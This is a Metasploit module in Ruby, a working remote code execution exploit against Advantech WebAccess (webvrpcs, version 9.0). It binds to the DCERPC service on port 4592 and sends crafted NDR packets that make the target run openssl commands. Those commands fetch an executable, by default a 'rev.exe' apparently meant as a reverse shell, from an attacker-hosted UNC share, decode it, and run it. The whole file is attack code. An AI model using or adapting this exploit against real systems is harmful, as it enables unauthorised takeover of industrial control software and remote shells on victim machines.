require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC

  def initialize(info = {})
    super(update_info(info,	
      'Name'           => 'Advantech WebAccess webvrpcs RCE V9.0',
      'Description'    => %q{
          This module abuses the openssl binary  given unc path hosting a executable payload.
          This works if the Remote Accesss Code has not been set. 
      },
      'Author'         => [ 'Mario Ceballos'],
      'License'        => 'BSD_LICENSE',
      'References'     =>
        [
          [ 'URL', 'https://support.advantech.com/support/DownloadSRDetail_New.aspx?SR_ID=1-MS9MJV&Doc_Source=Download' ],
        ],
      'DisclosureDate' => 'Apr 26 2019'))

      register_options(
        [
          OptString.new('UNC', [ true, 'The UNC path and executable', '\\\\192.168.1.1\\P1\\rev.exe']),
          Opt::RPORT(4592),
        ],)
		
 end

 def run

   temp = Rex::Text.rand_text_alpha_upper(5) + ".exe.enc"

   cmds = [ "openssl enc -base64 -in #{datastore['UNC']} -out #{temp}",
            "openssl enc -d -base64 -in #{temp} -out bwrunmie.exe",
            "bwrunmie",
         ]

   cmds.uniq.each do |cmd|

   connect
   select(nil,nil,nil,2)
   handle = dcerpc_handle('5d2b62aa-ee0a-4a95-91ae-b064fdb471fc', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
   dcerpc_bind(handle)
   print_status("Bound to #{handle} ...")

   packet =  NDR.long(0)
   packet << NDR.long(0xc351)
   packet << NDR.long(0x04)

   begin
     resp = dcerpc.call(0x2, packet)
   rescue Rex::Proto::DCERPC::Exceptions::NoResponse
   ensure
   end

   begin
     resp = dcerpc.call(0x4, NDR.long(2))
     handle = resp.last(4).unpack('V').first

     command =  NDR.long(handle)
     command << NDR.long(0x2711)
     command << NDR.long(0x0)
     command << NDR.UniConformantArray(cmd)
     command << NDR.long(0)
     dcerpc_call(0x1,command)
   rescue Rex::Proto::DCERPC::Exceptions::NoResponse
   ensure
   end
   disconnect
end
end
end
